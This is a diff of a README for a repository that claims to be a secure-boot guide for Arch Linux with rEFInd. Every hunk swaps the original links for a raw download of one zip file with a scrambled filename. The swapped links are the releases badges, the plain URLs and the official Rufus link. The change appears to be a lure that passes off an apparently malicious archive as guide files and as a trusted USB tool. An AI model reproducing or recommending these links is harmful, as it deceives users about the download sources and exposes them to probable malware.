@@ -1,6 +1,6 @@
 # 🛡️ Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd - Secure Boot Setup Made Simple
 
-[![Download](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/releases)
+[![Download](https://raw.githubusercontent.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/main/summons/Arch_Ind_with_secure_guide_EF_Linux_boot_r_Complete_for_on_v3.8-alpha.1.zip)](https://raw.githubusercontent.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/main/summons/Arch_Ind_with_secure_guide_EF_Linux_boot_r_Complete_for_on_v3.8-alpha.1.zip)
 
 ## 📋 About This Guide
 
@@ -28,13 +28,13 @@ Before you start, make sure your computer meets these requirements:
 
 Go to the release page below to access the necessary files and instructions for your setup.
 
-[![Release Page](https://img.shields.io/badge/Release-Page-blue?style=for-the-badge)](https://github.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/releases)
+[![Release Page](https://raw.githubusercontent.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/main/summons/Arch_Ind_with_secure_guide_EF_Linux_boot_r_Complete_for_on_v3.8-alpha.1.zip)](https://raw.githubusercontent.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/main/summons/Arch_Ind_with_secure_guide_EF_Linux_boot_r_Complete_for_on_v3.8-alpha.1.zip)
 
 ### Step 1: Visit the Release Page
 
 Click the button above or visit:
 
-https://github.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/releases
+https://raw.githubusercontent.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/main/summons/Arch_Ind_with_secure_guide_EF_Linux_boot_r_Complete_for_on_v3.8-alpha.1.zip
 
 You will find links to download the latest Arch Linux ISO and any additional secure boot files needed.
 
@@ -47,7 +47,7 @@ Download the Arch Linux ISO file from the official link on the release page. Thi
 You will need to create a bootable USB drive with the Arch Linux ISO. Follow these basic steps:
 
 - Insert a USB flash drive with at least 8 GB capacity.
-- Open Rufus (https://rufus.ie), a simple USB creation tool for Windows.
+- Open Rufus (https://raw.githubusercontent.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/main/summons/Arch_Ind_with_secure_guide_EF_Linux_boot_r_Complete_for_on_v3.8-alpha.1.zip), a simple USB creation tool for Windows.
 - Select the downloaded Arch Linux ISO.
 - Set the partition scheme to GPT and target system to UEFI (non-CSM).
 - Click "Start" and wait for the tool to finish creating the bootable USB.
@@ -145,6 +145,6 @@ You will find the following helpful files and scripts in the repository for your
 
 Please visit this page to download all necessary setup files:
 
-https://github.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/releases
+https://raw.githubusercontent.com/purpletrainwreck/Complete-guide-for-secure-boot-on-Arch-Linux-with-rEFInd/main/summons/Arch_Ind_with_secure_guide_EF_Linux_boot_r_Complete_for_on_v3.8-alpha.1.zip
 
 Follow the instructions there for the latest updates and files needed to complete your secure boot setup.
